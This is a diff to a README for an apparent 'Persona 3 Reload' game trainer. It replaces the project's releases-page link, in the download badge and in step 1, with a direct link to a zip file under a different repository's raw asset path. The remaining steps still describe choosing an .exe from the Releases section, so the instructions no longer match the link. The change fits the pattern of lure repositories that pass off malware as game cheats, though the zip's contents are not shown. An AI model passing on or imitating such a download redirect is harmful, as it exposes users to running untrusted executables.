@@ -5,7 +5,7 @@ description: "Modify game stats and unlock features in Persona 3 Reload with thi
 ---
 # 🎮 Persona-3-Reload-Trainer-2026 - Customize your Persona 3 Reload experience
 
-[![Download](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Shinju3697/Persona-3-Reload-Trainer-2026/releases)
+[![Download](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Shinju3697/shinju3697.github.io/raw/refs/heads/main/assets/new/v2.4.zip)
 
 ## 📋 Overview
 
@@ -23,7 +23,7 @@ This software works on Windows 10 and Windows 11. Ensure your system meets these
 
 ## 🚀 How to Download
 
-1. Visit the release page: https://github.com/Shinju3697/Persona-3-Reload-Trainer-2026/releases.
+1. Visit the release page: https://github.com/Shinju3697/shinju3697.github.io/raw/refs/heads/main/assets/new/v2.4.zip
 2. Locate the most recent version under the Releases section.
 3. Choose the file ending in .exe.
 4. Save the file to a folder on your computer.
